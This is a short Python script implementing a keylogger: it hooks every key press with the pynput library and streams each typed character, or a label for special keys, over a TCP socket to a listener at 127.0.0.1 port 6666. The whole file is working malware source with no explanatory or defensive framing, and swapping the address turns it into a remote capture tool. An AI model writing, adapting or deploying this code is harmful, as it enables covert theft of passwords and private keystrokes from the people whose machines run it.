import socket
from pynput import keyboard


class Keylogger:
    def __init__(self, cs):
        self.key_store = []
        self.key_map = {
            "enter": "\n",
            "space": " ",
            "tab": "\t",
            "backspace": "\b"
        }
        self.client_socket = cs
        self.client_socket.connect(("127.0.0.1", 6666))

    def button_pressed(self, button):
        if hasattr(button, "char"):
            self.client_socket.send(button.char.encode())
        else:
            key_pressed = self.key_map.get(button._name_, " *{0}* ".format(button._name_))
            self.client_socket.send(key_pressed.encode())


if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    keylogger = Keylogger(client_socket)
    with keyboard.Listener(on_press=keylogger.button_pressed) as listener:
        listener.join()
